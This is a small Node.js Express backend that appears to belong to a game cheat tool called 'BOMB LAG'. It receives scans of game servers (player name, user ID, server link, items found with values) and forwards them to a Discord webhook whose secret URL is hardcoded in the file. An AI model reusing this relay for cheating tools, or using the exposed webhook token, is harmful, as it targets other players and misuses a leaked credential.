const express = require("express");
const fetch = require("node-fetch");

const app = express();
app.use(express.json());

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457116012490264626/uKtDP7Ru3QvqrBFz-klP2IFCcHn3LZ2u1PQ8BOLYAO_uHiRBNMLlPLovc-CbNbcgYS9j";

app.post("/log", async (req, res) => {
    const d = req.body;

    let thingsText = "None detected";
    if (Array.isArray(d.things) && d.things.length > 0) {
        thingsText = d.things
            .slice(0, 15)
            .map(t => `• **${t.name}** → ${t.value}`)
            .join("\n");
    }

    const embed = {
        title: "💣 BOMB LAG – Server Scan",
        color: 0xff3c3c,
        fields: [
            { name: "👤 Player", value: d.playerName, inline: true },
            { name: "🆔 UserId", value: String(d.userId), inline: true },
            { name: "🎮 Game", value: d.gameName || "Unknown", inline: false },
            { name: "🔗 Server", value: d.serverLink, inline: false },
            { name: "🧠 Things Found", value: thingsText, inline: false }
        ],
        timestamp: new Date(d.time * 1000)
    };

    await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
    });

    res.json({ success: true });
});

app.listen(process.env.PORT || 10000, () =>
    console.log("🚀 Backend running")
);
